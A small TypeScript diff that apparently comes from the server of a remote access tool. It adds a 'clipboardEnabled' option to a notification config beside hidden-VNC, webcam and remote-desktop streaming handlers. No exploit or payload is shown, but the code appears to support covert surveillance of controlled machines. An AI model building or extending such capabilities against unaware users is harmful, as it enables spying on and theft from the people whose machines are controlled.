@@ -31,7 +31,7 @@ type WsLifecycleDeps = {
   rdStreamingState: Map<string, unknown>;
   hvncStreamingState: Map<string, unknown>;
   webcamStreamingState: Map<string, unknown>;
-  getNotificationConfig: () => { keywords?: string[]; minIntervalMs?: number };
+  getNotificationConfig: () => { keywords?: string[]; minIntervalMs?: number; clipboardEnabled?: boolean };
   handleDashboardViewerOpen: (ws: ServerWebSocket<SocketData>) => void;
   handleConsoleViewerOpen: (ws: ServerWebSocket<SocketData>) => void;
   handleRemoteDesktopViewerOpen: (ws: ServerWebSocket<SocketData>) => void;
@@ -121,6 +121,7 @@ export function handleWebSocketOpen(ws: ServerWebSocket<SocketData>, deps: WsLif
       notification: {
         keywords: notificationConfig.keywords || [],
         minIntervalMs: notificationConfig.minIntervalMs || 8000,
+        clipboardEnabled: notificationConfig.clipboardEnabled || false,
       },
     }),
   );
